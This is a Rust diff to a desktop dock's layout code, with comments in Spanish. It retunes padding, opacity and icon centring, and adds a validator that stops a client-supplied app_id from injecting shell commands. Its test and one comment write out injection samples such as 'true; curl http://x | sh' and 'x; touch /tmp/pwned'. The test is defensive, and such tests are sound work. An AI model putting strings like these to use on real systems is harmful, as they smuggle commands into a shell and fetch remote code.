@@ -1,8 +1,9 @@
 //! El dock: rectángulo redondeado con los lanzadores, abajo y centrado.
 //!
-//! La geometría sale del prototipo `bookos/prototypes/DockMagnify.qml`, para
-//! que el dock en Rust sea el mismo dock que ya habías calibrado en QML: icono
-//! de 50, hueco de 14, padding de 9 y esquinas de 22 (redondeado, no cápsula).
+//! La geometría de partida salió del prototipo `bookos/prototypes/DockMagnify.qml`
+//! —icono de 50, hueco de 14, esquinas de 22 (redondeado, no cápsula)—, con el
+//! padding retocado después: los 9 px calibrados en QML dejaban el primer y el
+//! último icono pegados al borde redondeado del dock.
 //!
 //! El puntero ya llega: se señala el icono de debajo, se pulsa y se lanza, y un
 //! punto marca las aplicaciones que tienen ventana.
@@ -27,35 +28,79 @@ use crate::view::{ACENTO, PanelElement, TEXT};
 
 pub const ICON: f32 = 50.0;
 pub const GAP: f32 = 14.0;
-pub const PAD: f32 = 9.0;
+/// Padding horizontal: del borde del dock al primer y al último icono.
+///
+/// Antes iba a 9 en las cuatro direcciones —lo que traía calibrado
+/// `DockMagnify.qml`—, y con la esquina de 22 px (`tema::R_TARJETA`) la curva
+/// se comía casi todo ese aire: el dock se leía más estrecho de lo que medía,
+/// con los iconos de los extremos tocando el borde redondeado.
+pub const PAD: f32 = 15.0;
+/// Padding vertical. Va aparte del horizontal por la misma razón que subió
+/// `PAD`, pero no tiene por qué valer lo mismo: aquí no hay ningún icono en
+/// el extremo que se lea pegado a una esquina, solo al borde recto de arriba
+/// y de abajo.
+pub const PAD_V: f32 = 15.0;
 /// Separación entre el dock y el borde inferior de la pantalla.
 pub const MARGIN: f32 = 12.0;
 
-/// El `card` del sistema de diseño, translúcido: el dock flota sobre el
-/// escritorio y opaco se vería pegado.
-///
-/// 0,30 por lo mismo que el panel: debajo va el cristal esmerilado que dibuja
-/// el compositor, y con 0,78 encima apenas se distinguía del dock opaco.
+/// El `card` del sistema de diseño, oscurecido en el tema oscuro y con una
+/// opacidad algo menor para que el dock siga flotando sobre el fondo.
 fn fondo() -> Color {
     Color {
-        a: 0.30,
-        ..tema::card()
+        a: 0.75,
+        ..if tema::es_claro() {
+            tema::card()
+        } else {
+            tema::mezclar(tema::card(), Color::BLACK, 0.40)
+        }
     }
 }
 
 /// El mismo fondo cuando el dock está pegado al borde. Más cuerpo que el
 /// flotante: apoyado en el borde deja de leerse como algo que va y viene y pasa
-/// a ser parte del marco de la pantalla, y con 0,30 se veía como si estuviese
-/// despegado y transparente a la vez.
+/// a ser parte del marco de la pantalla.
 fn fondo_pegado() -> Color {
     Color {
-        a: 0.55,
-        ..tema::card()
+        a: 0.75,
+        ..if tema::es_claro() {
+            tema::card()
+        } else {
+            tema::mezclar(tema::card(), Color::BLACK, 0.40)
+        }
     }
 }
 
 /// Alto de la banda del indicador de ventana abierta, bajo el icono.
 const PUNTO: f32 = 7.0;
+
+/// Padding de arriba y de abajo del icono, ya descontada la banda del
+/// indicador.
+///
+/// Con `PAD_V` a secas arriba y abajo, el bloque icono+indicador —que mide
+/// `tamano + PUNTO`— quedaba centrado como bloque, pero el indicador es
+/// invisible cuando la app no tiene ventana: lo que se ve es el icono solo,
+/// desplazado `PUNTO / 2` hacia arriba del centro real del dock. Pasar la
+/// mitad de esa banda del padding de abajo al de arriba lo baja al centro sin
+/// tocar el alto total (`PAD_V_ARRIBA + PAD_V_ABAJO` sigue siendo `PAD_V * 2`):
+/// 18,5 por encima del icono y 7 + 11,5 por debajo.
+///
+/// Estuvo con el signo al revés —restando arriba y sumando abajo—, que
+/// duplicaba el desplazamiento en vez de quitarlo: medido en pantalla, 11,5
+/// por encima del icono y 25,5 por debajo.
+const PAD_V_ARRIBA: f32 = PAD_V + PUNTO / 2.0;
+const PAD_V_ABAJO: f32 = PAD_V - PUNTO / 2.0;
+
+/// ¿Se puede pasar esto a un intérprete de órdenes sin miedo?
+///
+/// El juego de caracteres de un `app_id` de verdad —`org.kde.konsole`,
+/// `firefox`, `code-oss`— y ni uno más. Nada de espacios, comillas, `;`, `|`,
+/// `$` ni `&`: eso ya no es un nombre de programa, es una orden.
+fn lanzable(id: &str) -> bool {
+    !id.is_empty()
+        && id
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || matches!(c, '.' | '-' | '_' | '+'))
+}
 
 /// Un lanzador del dock.
 pub struct DockItem {
@@ -279,7 +324,14 @@ impl Dock {
             let respaldo = id.rsplit('.').next().unwrap_or(id);
             let (exec, label, icono) = match &app {
                 Some(a) => (a.exec.as_str(), a.nombre.as_str(), a.icono.as_str()),
-                None => (id.as_str(), respaldo, id.as_str()),
+                // El `app_id` lo elige el cliente y no lo comprueba nadie, y de
+                // aquí acaba en `/bin/sh -c`: uno que se llame
+                // `true; curl algo | sh` ejecutaría eso al pulsar su icono. El
+                // que no parezca un nombre de programa entra en el dock sin
+                // nada que lanzar; el icono sigue saliendo mientras su ventana
+                // viva, que es para lo que está.
+                None if lanzable(id) => (id.as_str(), respaldo, id.as_str()),
+                None => ("", respaldo, id.as_str()),
             };
             let mut item = DockItem::new(exec, label, icono, id);
             item.anclada = false;
@@ -314,7 +366,7 @@ impl Dock {
     pub fn item_en(&self, x: f32, y: f32) -> Option<usize> {
         // La banda del indicador cuenta como parte del icono: pulsar el punto
         // de "abierta" es pulsar la aplicación, no un hueco muerto.
-        if y < PAD || y > PAD + self.tamano + PUNTO {
+        if y < PAD_V_ARRIBA || y > PAD_V_ARRIBA + self.tamano + PUNTO {
             return None;
         }
         let rel = x - PAD;
@@ -369,12 +421,16 @@ impl Dock {
         let n = self.items.len().max(1) as f32;
         (
             PAD * 2.0 + n * self.tamano + (n - 1.0) * GAP,
-            PAD * 2.0 + self.tamano + PUNTO,
+            PAD_V * 2.0 + self.tamano + PUNTO,
         )
     }
 
     pub fn view(&self) -> PanelElement<'_> {
-        let mut fila = row![].spacing(GAP);
+        // Todos los lanzadores comparten el mismo eje vertical, aunque el
+        // contenido interno de algún icono tenga transparencias distintas.
+        let mut fila = row![]
+            .spacing(GAP)
+            .align_y(iced_core::alignment::Vertical::Center);
         for (i, item) in self.items.iter().enumerate() {
             fila = fila.push(icon_view(item, self.hover.intensidad(i), self.tamano));
         }
@@ -394,7 +450,12 @@ impl Dock {
             (fondo(), tema::R_TARJETA.into())
         };
         container(fila)
-            .padding(PAD)
+            .padding(iced_core::Padding {
+                top: PAD_V_ARRIBA,
+                bottom: PAD_V_ABAJO,
+                left: PAD,
+                right: PAD,
+            })
             .style(move |_theme| container::Style {
                 background: Some(fondo.into()),
                 border: Border {
@@ -421,7 +482,7 @@ impl Dock {
 ///
 /// Todavía no es la lente de `DockMagnify.qml`: magnificar de verdad exige que
 /// el icono se salga de su slot, y el buffer del dock hoy mide exactamente
-/// `PAD*2 + self.tamano` de alto, así que lo ampliado quedaría cortado. Reservar ese
+/// `PAD_V*2 + self.tamano` de alto, así que lo ampliado quedaría cortado. Reservar ese
 /// hueco cambia la geometría ya calibrada y va aparte.
 fn icon_view(item: &DockItem, señalado: f32, tamano: f32) -> PanelElement<'_> {
     let contenido: PanelElement<'_> = match &item.icon {
@@ -554,9 +615,9 @@ mod tests {
     fn el_centro_de_cada_icono_es_suyo() {
         let d = dock(3);
         let centro = |i: usize| PAD + i as f32 * (ICON + GAP) + ICON / 2.0;
-        assert_eq!(d.item_en(centro(0), PAD + ICON / 2.0), Some(0));
-        assert_eq!(d.item_en(centro(1), PAD + ICON / 2.0), Some(1));
-        assert_eq!(d.item_en(centro(2), PAD + ICON / 2.0), Some(2));
+        assert_eq!(d.item_en(centro(0), PAD_V_ARRIBA + ICON / 2.0), Some(0));
+        assert_eq!(d.item_en(centro(1), PAD_V_ARRIBA + ICON / 2.0), Some(1));
+        assert_eq!(d.item_en(centro(2), PAD_V_ARRIBA + ICON / 2.0), Some(2));
     }
 
     #[test]
@@ -568,11 +629,14 @@ mod tests {
             assert_eq!(d.tamano_actual(), lado as u32);
             for i in 0..3 {
                 assert_eq!(
-                    d.item_en(PAD + i as f32 * (lado + GAP) + lado / 2.0, PAD + lado / 2.0),
+                    d.item_en(
+                        PAD + i as f32 * (lado + GAP) + lado / 2.0,
+                        PAD_V_ARRIBA + lado / 2.0
+                    ),
                     Some(i)
                 );
             }
-            assert_eq!(d.size().1, PAD * 2.0 + lado + PUNTO);
+            assert_eq!(d.size().1, PAD_V * 2.0 + lado + PUNTO);
         }
     }
 
@@ -581,23 +645,26 @@ mod tests {
         let d = dock(3);
         // Justo en medio del GAP que separa el primero del segundo.
         let x = PAD + ICON + GAP / 2.0;
-        assert_eq!(d.item_en(x, PAD + ICON / 2.0), None);
+        assert_eq!(d.item_en(x, PAD_V_ARRIBA + ICON / 2.0), None);
     }
 
     #[test]
     fn fuera_del_dock_no_hay_item() {
         let d = dock(3);
-        let y = PAD + ICON / 2.0;
+        let y = PAD_V_ARRIBA + ICON / 2.0;
         // El padding de la izquierda y la franja de arriba.
         assert_eq!(d.item_en(PAD / 2.0, y), None);
-        assert_eq!(d.item_en(PAD + ICON / 2.0, PAD / 2.0), None);
+        assert_eq!(d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA / 2.0), None);
         // Abajo, el icono llega hasta el final de la banda del indicador: ese
         // punto es de la aplicación, no un hueco muerto.
         assert_eq!(
-            d.item_en(PAD + ICON / 2.0, PAD + ICON + PUNTO / 2.0),
+            d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA + ICON + PUNTO / 2.0),
             Some(0)
         );
-        assert_eq!(d.item_en(PAD + ICON / 2.0, PAD + ICON + PUNTO + 1.0), None);
+        assert_eq!(
+            d.item_en(PAD + ICON / 2.0, PAD_V_ARRIBA + ICON + PUNTO + 1.0),
+            None
+        );
         // Y más allá del último icono, dentro del ancho por el padding derecho.
         let (ancho, _) = d.size();
         assert_eq!(d.item_en(ancho - PAD / 2.0, y), None);
@@ -734,5 +801,29 @@ mod anclado {
             "launchpad",
         );
         assert_eq!(dock.items().len(), antes);
+    }
+
+    /// Un `app_id` con una orden dentro no se convierte en algo que lanzar.
+    ///
+    /// El `app_id` lo elige el cliente y de ahí sale el `exec` del item cuando
+    /// no hay `.desktop`; ese `exec` acaba en `/bin/sh -c`.
+    #[test]
+    fn un_app_id_con_orden_dentro_no_se_lanza() {
+        assert!(lanzable("org.kde.konsole"));
+        assert!(lanzable("code-oss"));
+        assert!(lanzable("gtk4-demo"));
+        assert!(!lanzable("true; curl http://x | sh"));
+        assert!(!lanzable("prog $(id)"));
+        assert!(!lanzable("prog&&otro"));
+        assert!(!lanzable(""));
+
+        let mut dock = Dock::from_config(&crate::Config::default().dock);
+        dock.set_abiertas(&["x; touch /tmp/pwned".into()]);
+        let item = dock
+            .items()
+            .iter()
+            .find(|i| i.app_id() == "x; touch /tmp/pwned")
+            .expect("el icono entra en el dock mientras su ventana viva");
+        assert_eq!(item.exec(), "", "no puede quedar nada que pasarle al shell");
     }
 }
